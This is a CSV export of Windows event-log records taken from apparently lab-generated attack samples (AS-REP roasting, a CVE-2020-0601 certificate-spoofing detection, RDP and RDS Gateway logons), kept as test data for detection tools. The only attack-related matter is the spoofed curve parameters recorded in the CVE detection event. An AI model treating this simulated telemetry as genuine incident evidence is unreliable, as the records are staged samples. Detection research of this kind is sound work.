RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
41,37900,2021-04-29 07:59:42.5451096,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7AE25,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7AE25""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
42,37901,2021-04-29 07:59:42.5452184,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54389""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
43,37902,2021-04-29 07:59:42.5525325,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,19156,2020-01-18 18:14:29.8318684,1,Warning,Microsoft-Windows-Audit-CVE,Application,23004,22388,Isaac,0,S-1-5-21-955638165-4017457581-270078328-1001,An attempt to exploit a known vulnerability detected,,,[CVE-2020-0601] cert validation,CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Vulnerabilities/App_1_CVE-Detected.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""CVEID"",""#text"":""[CVE-2020-0601] cert validation""},{""@Name"":""AdditionalDetails"",""#text"":""CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101""}]}}"
74,74,2024-11-04 13:55:34.6579658,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 678033 bytes and received 810679 bytes",The client session duration was 122 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""810679"",""BytesTransfered"":""678033"",""SessionDuration"":""122"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
75,75,2024-11-04 13:58:08.6464861,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
76,76,2024-11-04 13:58:09.2054417,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
77,77,2024-11-04 13:58:14.2410561,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
78,78,2024-11-04 13:58:14.4809723,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
79,79,2024-11-04 13:58:27.8827187,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
80,80,2024-11-04 13:58:27.9212444,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2452,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
81,81,2024-11-04 13:58:27.9786474,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
82,82,2024-11-04 13:58:28.0284523,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
83,83,2024-11-04 13:58:28.0319644,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
84,84,2024-11-04 13:59:25.4316243,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 241242 bytes and received 391624 bytes",The client session duration was 57 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""391624"",""BytesTransfered"":""241242"",""SessionDuration"":""57"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
85,85,2024-11-04 13:59:31.1919595,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
86,86,2024-11-04 13:59:31.3792093,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
87,87,2024-11-04 13:59:32.4005868,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
88,88,2024-11-04 13:59:32.6212995,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
89,89,2024-11-04 13:59:32.6243736,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
2262,2262,2024-11-14 03:22:50.7567375,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2263,2263,2024-11-14 03:22:50.7570148,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2264,2264,2024-11-14 03:22:50.7572505,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2265,2265,2024-11-14 03:23:10.6174382,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,4932,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2266,2266,2024-11-14 03:23:10.8516729,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2267,2267,2024-11-22 21:53:00.4081622,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,964,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2268,2268,2024-11-22 21:53:00.4108461,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2269,2269,2024-11-22 21:53:00.4123603,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2270,2270,2024-11-22 21:53:00.4126543,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2271,2271,2024-11-22 21:53:00.4134804,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2272,2272,2024-11-22 21:53:00.4139932,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2273,2273,2024-11-22 21:53:04.6977916,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2274,2274,2024-11-22 21:53:04.6979987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2275,2275,2024-11-22 21:53:04.7983551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2276,2276,2024-11-22 21:53:04.7997466,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2277,2277,2024-11-22 21:53:05.7343396,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2278,2278,2024-11-22 21:53:43.5297395,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
